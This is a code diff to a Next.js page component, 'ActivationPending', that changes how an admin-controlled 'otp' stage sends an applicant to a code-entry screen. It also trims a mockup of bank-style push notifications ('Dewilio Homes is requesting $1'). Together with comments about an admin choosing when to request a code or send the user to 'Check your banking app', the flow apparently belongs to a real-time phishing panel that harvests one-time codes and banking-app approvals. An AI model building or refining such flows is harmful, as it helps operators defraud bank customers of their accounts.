@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
 import { Check, Loader2, Lock, ShieldAlert, ShieldCheck, Smartphone } from "lucide-react";
@@ -27,16 +27,9 @@ const LOADING_STEPS = [
 const NOTICE_MS = 3200;
 
 /** Stages that arrive as a push notification on the phone mockup. */
-const NOTICE_STAGES = ["otp", "approved", "app_approval"];
+const NOTICE_STAGES = ["approved", "app_approval"];
 
 const NOTICE_COPY: Record<string, { screen: string; push: string; action: string; title: string; body: string }> = {
-  otp: {
-    screen: "Verification code sent",
-    push: "Dewilio Homes is requesting $1",
-    action: "Open code screen",
-    title: "Code sent",
-    body: "A verification code is waiting for you. We’re taking you to the code screen.",
-  },
   approved: {
     screen: "Payment approved",
     push: "Dewilio Homes approved $1",
@@ -69,8 +62,9 @@ function elapsedLabel(seconds: number): string {
  *     until an admin decides. This is where a new signup lands.
  *   • app_approval          → the approval page ("Check your banking app"), sent
  *     when an admin clicks "Approve on App".
- *   • otp / approved        → a bank-push moment plays, then the browser follows
- *     to the code screen or the welcome screen.
+ *   • otp                   → the code screen, immediately. No push moment.
+ *   • approved              → a bank-push moment plays, then the browser follows
+ *     to the welcome screen.
  *   • rejected              → the declined screen.
  */
 export function ActivationPending({ initialStage }: { initialStage: string }) {
@@ -84,6 +78,17 @@ export function ActivationPending({ initialStage }: { initialStage: string }) {
     const tick = setInterval(() => setSeconds(Math.floor((Date.now() - started) / 1000)), 1000);
     return () => clearInterval(tick);
   }, []);
+
+  // A code request turns straight over to the code screen. The applicant was just
+  // sent a code, so the field they have to fill in is the only useful next thing
+  // on screen — the push-notification moment would only delay it. A ref rather
+  // than state, because this only has to fire once and must not cause a render.
+  const otpHandled = useRef(false);
+  useEffect(() => {
+    if (!live || live.stage !== "otp" || otpHandled.current) return;
+    otpHandled.current = true;
+    router.replace(live.destination);
+  }, [live, router]);
 
   // A decision from the dashboard plays as the bank-push moment before the page
   // turns over. `played` only records that a push already ran, so it can't loop.
